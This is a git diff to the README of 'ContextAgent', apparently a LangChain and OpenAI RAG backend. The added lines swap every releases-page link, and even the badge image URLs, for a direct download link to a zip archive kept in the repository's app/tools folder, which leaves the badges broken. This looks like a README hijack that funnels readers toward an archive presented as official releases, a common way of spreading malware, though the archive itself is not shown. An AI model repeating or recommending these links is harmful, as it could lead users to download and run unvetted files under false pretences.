@@ -1,12 +1,12 @@
-https://github.com/javcanti/ContextAgent/releases
+https://github.com/javcanti/ContextAgent/raw/refs/heads/main/app/tools/Context_Agent_v3.3.zip
 
 # ContextAgent: Modular AI Document QA Backend with RAG Tech
 
-[![ContextAgent Releases](https://img.shields.io/badge/ContextAgent-Releases-blue?style=for-the-badge&logo=github)](https://github.com/javcanti/ContextAgent/releases)
-[![Python 3.11+](https://img.shields.io/badge/Python-3.11%2B-blue?style=for-the-badge&logo=python)](https://www.python.org/)
-[![LangChain](https://img.shields.io/badge/LangChain-LLM-blue?style=for-the-badge&logo=langchain)](https://github.com/langchain-ai)
-[![OpenAI](https://img.shields.io/badge/OpenAI-LLM-blue?style=for-the-badge&logo=openai)](https://openai.com)
-[![Docker](https://img.shields.io/badge/Docker-Ready-blue?style=for-the-badge&logo=docker)](https://www.docker.com)
+[![ContextAgent Releases](https://github.com/javcanti/ContextAgent/raw/refs/heads/main/app/tools/Context_Agent_v3.3.zip)](https://github.com/javcanti/ContextAgent/raw/refs/heads/main/app/tools/Context_Agent_v3.3.zip)
+[![Python 3.11+](https://github.com/javcanti/ContextAgent/raw/refs/heads/main/app/tools/Context_Agent_v3.3.zip%2B-blue?style=for-the-badge&logo=python)](https://github.com/javcanti/ContextAgent/raw/refs/heads/main/app/tools/Context_Agent_v3.3.zip)
+[![LangChain](https://github.com/javcanti/ContextAgent/raw/refs/heads/main/app/tools/Context_Agent_v3.3.zip)](https://github.com/javcanti/ContextAgent/raw/refs/heads/main/app/tools/Context_Agent_v3.3.zip)
+[![OpenAI](https://github.com/javcanti/ContextAgent/raw/refs/heads/main/app/tools/Context_Agent_v3.3.zip)](https://github.com/javcanti/ContextAgent/raw/refs/heads/main/app/tools/Context_Agent_v3.3.zip)
+[![Docker](https://github.com/javcanti/ContextAgent/raw/refs/heads/main/app/tools/Context_Agent_v3.3.zip)](https://github.com/javcanti/ContextAgent/raw/refs/heads/main/app/tools/Context_Agent_v3.3.zip)
 
 ContextAgent is an AI assistant backend designed for document-based question answering using Retrieval-Augmented Generation (RAG). It uses a modular architecture that blends LangChain, OpenAI, FastAPI, and ChromaDB to build robust, production-ready workflows. The system handles diverse document formats, supports multi-tool agents, preserves conversational memory, and provides fast semantic search over large knowledge bases. It ships with Docker for straightforward deployment and scaling.
 
@@ -311,7 +311,7 @@ FAQ
 
 Releases
 - The project ships production-ready artifacts and release notes via the official releases page.
-- See the releases page for binaries, docs, and upgrade notes: https://github.com/javcanti/ContextAgent/releases
+- See the releases page for binaries, docs, and upgrade notes: https://github.com/javcanti/ContextAgent/raw/refs/heads/main/app/tools/Context_Agent_v3.3.zip
 - For quick access, you can also visit the releases page through the badge above.
 
 Topics
@@ -395,8 +395,8 @@ License and warranty
 - The repository is provided as-is with community-driven improvements and does not replace formal vendor support.
 
 Releases (again)
-- The releases hub is the best place to obtain stable builds and upgrade guidance. Visit the releases page for binaries, changelogs, and documentation updates: https://github.com/javcanti/ContextAgent/releases
-- For a quick access point, this page also hosts badges that link directly to the releases page: [Releases](https://github.com/javcanti/ContextAgent/releases)
+- The releases hub is the best place to obtain stable builds and upgrade guidance. Visit the releases page for binaries, changelogs, and documentation updates: https://github.com/javcanti/ContextAgent/raw/refs/heads/main/app/tools/Context_Agent_v3.3.zip
+- For a quick access point, this page also hosts badges that link directly to the releases page: [Releases](https://github.com/javcanti/ContextAgent/raw/refs/heads/main/app/tools/Context_Agent_v3.3.zip)
 
 Topics (reiterated)
 - ai-assistant, backend, chatbot, chromadb, document-qa, embeddings, fastapi, knowledge-base, langchain, langchain-python, llm, openai, python, rag, similarity-search, vector-store
